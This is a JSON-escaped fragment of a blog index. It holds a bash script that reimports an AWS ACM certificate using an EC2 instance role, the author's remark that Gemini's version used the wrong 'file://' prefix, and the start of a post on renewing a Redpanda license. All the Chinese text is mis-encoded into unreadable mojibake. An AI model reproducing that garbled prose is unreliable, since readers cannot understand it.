class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# --- é…ç½®éƒ¨åˆ† ---\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ‚¨è¦æ›´æ–°çš„ç°æœ‰ ACM è¯ä¹¦çš„ ARN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç¤ºä¾‹ï¼šCERTIFICATE_ARN=\u0026#34;arn:aws:acm:ap-southeast-1:123456789012:certificate/abcdefab-1234-5678-abcd-1234567890ab\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_ARN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/11111111-1111-1111-1111-111111111111\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ–°è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š/opt/certs/new_certificate.crtï¼‰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç¡®ä¿è¿™ä¸ªè·¯å¾„åœ¨æ‚¨çš„EC2å®ä¾‹ä¸Šæ˜¯æ­£ç¡®çš„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_BODY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;_.rendoumi.com.only\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ–°ç§é’¥æ–‡ä»¶çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š/opt/certs/private.keyï¼‰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç¡®ä¿è¿™ä¸ªè·¯å¾„åœ¨æ‚¨çš„EC2å®ä¾‹ä¸Šæ˜¯æ­£ç¡®çš„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePRIVATE_KEY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;_.rendoumi.com.key\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è¯ä¹¦é“¾æ–‡ä»¶çš„è·¯å¾„ï¼ˆå¯é€‰ï¼‰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¦‚æœæ²¡æœ‰è¯ä¹¦é“¾ï¼Œè¯·å°†æ­¤å˜é‡ç•™ç©ºæˆ–æ³¨é‡Šæ‰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç¤ºä¾‹ï¼šCERTIFICATE_CHAIN_PATH=\u0026#34;/opt/certs/ca_bundle.crt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;_.rendoumi.com.issuer.crt\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# å¦‚æœæ²¡æœ‰é“¾ï¼Œè¯·å°†å…¶ç•™ç©º \u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ACM è¯ä¹¦æ‰€åœ¨çš„ AWS åŒºåŸŸ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è¿™ä¸ªåŒºåŸŸåº”è¯¥ä¸ CERTIFICATE_ARN ä¸­çš„åŒºåŸŸåŒ¹é…\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç¤ºä¾‹ï¼šAWS_REGION=\u0026#34;ap-southeast-1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAWS_REGION\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ap-southeast-1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# --- é…ç½®éƒ¨åˆ†ç»“æŸ ---\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- å¼€å§‹ä½¿ç”¨å®ä¾‹è§’è‰²é‡æ–°å¯¼å…¥ ACM è¯ä¹¦ ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;è¯ä¹¦ ARN: \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_ARN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;åŒºåŸŸ: \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eAWS_REGION\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e ! -f \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_BODY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;é”™è¯¯ï¼šè¯ä¹¦æ–‡ä»¶ \u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_BODY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; ä¸å­˜åœ¨ã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e ! -f \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePRIVATE_KEY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;é”™è¯¯ï¼šç§é’¥æ–‡ä»¶ \u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePRIVATE_KEY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; ä¸å­˜åœ¨ã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e ! -f \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;è­¦å‘Šï¼šè¯ä¹¦é“¾æ–‡ä»¶ \u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; å·²æŒ‡å®šä½†ä¸å­˜åœ¨ã€‚å°†ä¸åŒ…å«è¯ä¹¦é“¾è¿›è¡Œå¯¼å…¥ã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºè·¯å¾„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ„é€  AWS CLI å‘½ä»¤ã€‚AWS CLI ä¼šè‡ªåŠ¨ä½¿ç”¨å®ä¾‹è§’è‰²æä¾›çš„å‡­è¯ã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eIMPORT_CMD\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;aws acm import-certificate \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e  --certificate-arn \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_ARN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e  --certificate fileb://\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_BODY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e  --private-key fileb://\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePRIVATE_KEY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e  --region \\\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eAWS_REGION\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\\\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¦‚æœæœ‰è¯ä¹¦é“¾ï¼Œåˆ™æ·»åŠ åˆ°å‘½ä»¤ä¸­\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eIMPORT_CMD\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eIMPORT_CMD\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e --certificate-chain fileb://\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;æ­£åœ¨æ‰§è¡Œå‘½ä»¤ï¼š\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$IMPORT_CMD\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ‰§è¡Œå‘½ä»¤\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ³¨æ„ï¼šè¿™é‡Œæˆ‘ä»¬ä¸æŒ‡å®š --profile æˆ–ä»»ä½•å‡­è¯ï¼ŒAWS CLI ä¼šè‡ªåŠ¨ä½¿ç”¨å®ä¾‹IAMè§’è‰²ã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eeval\u003c/span\u003e \u003cspan class=\"nv\"\u003e$IMPORT_CMD\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ£€æŸ¥å‘½ä»¤æ‰§è¡Œç»“æœ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"nv\"\u003e$?\u003c/span\u003e -eq \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- è¯ä¹¦é‡æ–°å¯¼å…¥æˆåŠŸï¼---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ACM è¯ä¹¦ \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_ARN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e å·²æ›´æ–°ã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- è¯ä¹¦é‡æ–°å¯¼å…¥å¤±è´¥ï¼---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;è¯·æ£€æŸ¥é”™è¯¯æ¶ˆæ¯ï¼Œç¡®ä¿ï¼š\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1. EC2 å®ä¾‹å·²æ­£ç¡®é™„åŠ äº†å…·æœ‰ acm:ImportCertificate æƒé™çš„ IAM è§’è‰²ã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;2. è¯ä¹¦ã€ç§é’¥å’Œé“¾æ–‡ä»¶è·¯å¾„æ­£ç¡®ä¸”å¯è¯»ã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;3. è¯ä¹¦/ç§é’¥/é“¾çš„æ ¼å¼æ­£ç¡®ã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- è„šæœ¬æ‰§è¡Œå®Œæ¯• ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹èµ·æ¥çœŸçš„æ˜¯åˆè‡­åˆé•¿ï¼ŒåºŸè¯è¿ç¯‡ã€‚æ³¨æ„ï¼šgemini ç”Ÿæˆçš„ä»£ç æœ‰é—®é¢˜ï¼Œaws acm import-certificate çš„å‚æ•°ä¸­ï¼Œè¯ä¹¦æ–‡ä»¶çš„å‰ç¼€æ˜¯fileb://ï¼Œgeminiç»™çš„æ˜¯file://ï¼Œè°ƒè¯•äº†åŠå¤©ï¼Œæœ€åå»awsçœ‹äº†æ–‡æ¡£æ‰å‘ç°ã€‚\u003c/p\u003e","title":"awsçš„EC2æœåŠ¡å™¨ç”¨legoè·å¾—å…è´¹è¯ä¹¦å¹¶æ›´æ–°åˆ°ACM"},{"content":"ä¸Šå›æˆ‘ä»¬åœ¨ Kafkaçš„æµ‹è¯•æ›¿ä»£å“-Redpanda ä¸­è¯´äº†æ€ä¹ˆæ­å»ºï¼Œç»“æœç”¨äº†ä¸€ä¸ªæœˆï¼Œé—®é¢˜å°±æ¥äº†\nlicenseè¿‡æœŸäº†ï¼Œæ“¦çš„ï¼Œåªå…è®¸ç”¨30å¤©ï¼Œéœ€è¦ç»­è´¹äº†ã€‚\næ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€æ‰“å¼€ç½‘ç«™ï¼Œç”³è¯·30å¤©çš„å…è´¹license\nhttps://cloud.redpanda.com/try-enterprise\næ‰“å¼€ç½‘ç«™ï¼Œç„¶åå¡«å…¥å§“åå’Œé‚®ç®±ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªé•¿å­—ç¬¦ä¸²xyzï¼Œæ‹·è´ä¸‹æ¥\näºŒã€å»æœºå™¨ä¸Š\næˆ‘ä»¬æ˜¯ç”¨docker composeå¯åŠ¨çš„ï¼Œæ‰€ä»¥éœ€è¦è¿›å…¥å®¹å™¨ï¼Œå¯¼å…¥license\ndocker exec -it redpanda-0 /bin/sh rpk cluster license set xyz ä¸‰ã€é‡å¯å®¹å™¨\næŒ‰é“ç†ä¸Šä¸€æ­¥å¼„å®Œï¼Œå°±åº”è¯¥å¥½äº†çš„ï¼Œå¯æƒœè¿™äº§å“åšçš„ç¨€çƒ‚ã€‚è¿˜å¿…é¡»é‡å¯å®¹å™¨æ‰èµ·ä½œç”¨\ndocker compose restart å°±okäº†ï¼Œä½†æ˜¯30å¤©å°±æ›´æ–°ä¸€æ¬¡licenseï¼Œè€Œä¸”å¿…é¡»è¦é‡å¯å®¹å™¨ï¼Œè¿™è°å—å¾—äº†å•Šã€‚\nä¸‹å‘¨å°±æŠ½ç©ºè£…ä¸€ä¸ªä¸ä¾èµ–Zookeeperï¼Œç”¨Rraftçš„Kafkaæ¥ç”¨ï¼Œå½»åº•å»æ‰è¿™ä¸ªä¸ä¼¦ä¸ç±»çš„è½¯ä»¶ã€‚\n","permalink":"https://rendoumi.com/posts/20250725_redpanda_license/","summary":"\u003cp\u003eä¸Šå›æˆ‘ä»¬åœ¨ \u003ca href=\"/posts/20250516-redpanda/\"\u003eKafkaçš„æµ‹è¯•æ›¿ä»£å“-Redpanda\u003c/a\u003e ä¸­è¯´äº†æ€ä¹ˆæ­å»ºï¼Œç»“æœç”¨äº†ä¸€ä¸ªæœˆï¼Œé—®é¢˜å°±æ¥äº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725132008481\" loading=\"lazy\" 